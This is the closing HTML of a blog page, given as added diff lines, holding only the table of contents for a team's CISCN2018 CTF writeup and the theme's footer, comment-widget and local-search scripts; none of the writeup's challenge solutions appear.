+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Lounge战队-CISCN2018-Writeup"><span class="nav-number">1.</span> <span class="nav-text">The Lounge战队 CISCN2018 Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-Supermarket"><span class="nav-number">1.1.</span> <span class="nav-text">Pwn-Supermarket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-EasyWeb"><span class="nav-number">1.2.</span> <span class="nav-text">Web-EasyWeb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-Flag-in-your-hand"><span class="nav-number">1.3.</span> <span class="nav-text">Crypto-Flag_in_your_hand</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-寻找入侵者"><span class="nav-number">1.4.</span> <span class="nav-text">Misc-寻找入侵者</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-Memory-Forensic"><span class="nav-number">1.5.</span> <span class="nav-text">Misc-Memory_Forensic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-Picture"><span class="nav-number">1.6.</span> <span class="nav-text">Misc-Picture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-验证码"><span class="nav-number">1.7.</span> <span class="nav-text">Misc-验证码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-RUN"><span class="nav-number">1.8.</span> <span class="nav-text">Misc-RUN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-RE"><span class="nav-number">1.9.</span> <span class="nav-text">Reverse-RE</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Vicen</span>
+
+  
+</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">已经坚持写了24.6k字</span>
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+  
+    <script type="text/javascript">
+    (function(){
+      var appid = 'cytkWHfbK';
+      var conf = 'bcb28f4ece95ff2018c1f67cae138d36';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      if (width < 960) {
+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
